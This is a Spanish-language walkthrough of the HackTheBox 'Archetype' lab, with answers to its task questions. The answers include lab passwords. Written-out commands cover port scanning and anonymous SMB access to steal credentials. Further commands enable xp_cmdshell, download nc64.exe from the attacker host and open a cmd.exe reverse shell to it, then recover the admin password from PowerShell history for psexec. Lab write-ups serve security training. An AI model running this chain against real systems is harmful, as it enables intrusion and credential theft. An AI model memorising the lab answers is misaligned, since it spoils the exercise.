
1)¿Qué puerto TCP aloja un servidor de base de datos?
	1433

2)¿Cuál es el nombre del recurso compartido no administrativo disponible a través de SMB?
	backups
	![[Archetype6.png]]

3)¿Cuál es la contraseña identificada en el archivo del recurso compartido SMB?
	M3g4c0rp123

4)¿Qué script de la colección Impacket se puede utilizar para establecer una conexión autenticada a un servidor Microsoft SQL Server?
	mssqlclient.py

5)¿Qué procedimiento almacenado extendido de Microsoft SQL Server se puede utilizar para generar un intérprete de comandos de Windows?
	xp_cmdshell
	Es una función de SQL Server que permite ejecutar comandos del sistema operativo desde consultas SQL. Está deshabilitada por defecto

6)¿Qué script se puede utilizar para buscar posibles rutas para escalar privilegios en hosts Windows?
	Winpeas
	es una herramienta para Windows que automatiza la búsqueda de posibles vectores de **escalada de privilegios**.

7)¿Qué archivo contiene la contraseña del administrador?
	consolehost_history.txt



---
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.217.189
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.129.217.189 -oG allports
extractPorts allports
nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.129.217.189 -oN target
```

![[Archetype1.png]]

![[Archetype2.png]]

![[Archetype3.png]]

![[Archetype4.png]]
![[Archetype5.png]]
Por el ttl sabemos que es una maquina windows
*Puertos relevantes:*
`445` Es de [[smb]] y por lo que entiendo, dice que al final de todo en smb-security, nos podemos conectar como usuario guest

-------
# [[smb]] Para robar credenciales

```shell
smbclient -L 10.129.217.189 -p 445 -N              / Listamos los directorios
smbclient //10.129.217.189/backups -p 445 -N       / Entramos al directorio backups
```

![[Archetype7.png]]
Descargamos el archivo que esta en el directorio backups, y luego lo abrimos
![[Archetype8.png]]
Nos da dos datos relevantes:
Password=M3g4c0rp123
User ID=ARCHETYPE/sql_svc


-----
# Nos conectamos a la base de datos con impacket mssqlclient

Nos conectamos con impacket
`impacket-mssqlclient ARCHETYPE/sql_svc@10.129.217.189 -windows-auth`

![[Archetype10.png]]

Vamos a chequear con el comando `SELECT is_svrolemember('sysadmin')` si somos admin, si nos da de resultado 1 es true

![[Archetype11.png]]


#### Ahora activamos el [[xp_cmdshell]] ya que estaba desactivado

[Cheatsheet de comandos mssql](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
Vamos a activar el [[xp_cmdshell]] por que por defecto viene desactivado

```mssql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Ahora hacemos la prueba con `xp_cmdshell "whoami"` para ver si da output
![[Archetype12.png]]
Y como podemos ver responde que somos archetype/sql_svc. Asi que ya confirmamos que esta activado el xp_cmdshell



---------


# [[Reverse shell]] para la intrusion
#### Para mandar la [[Reverse shell]] vamos a necesitar de [[Netcat]]

[Link de netcat para 64bits](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) Vamos a levantar un server de [[python3 -m http.server]] desde nuestra maquina, para que por wget lo descargue la maquina victima. Y a posteriori vamos a ponernos en escucha con  [[rlwrap nc -lvnp 443]] para la reverseshell

```shell
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.16/nc64.exe -outfile nc64.exe           / Descargamos el archivo
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.16 443"                       / Mandamos la reverseshell
```

![[Archetype14.png]]
![[Archetype13.png]]

``rlwrap nc -lvnp 443``  Para estar en escucha

![[Imagenes/Archetype16.png]]
Y una vez dentro, podemos visualizar la primera flag

![[Archetype15.png]]



-------
# Escalada de privilegios mediante logs de consola

#### Vamos a visualizar los logs de la powershell para ver si hay algun dato critico

Los logs estan en esta ruta ``C:\Users\sql_svc\appdata\roaming\microsoft\windows\powershell\psreadline``

Y al visualizar el log, vemos una contraseña
![[Archetype16.png]]
MEGACORP_4dm1n!!

#### Asi que vamos a intentar conectarnos con [[impacket-psexec]] ya que esta el servicio [[smb]]

``impacket-psexec Administrator@10.129.95.187 -port 445``
![[Archetype17.png]]
Una vez dentro ya podemos visualizar la flag
![[Archtype18.png]]


--------
# Creditos
Writeup Oficial HackTheBox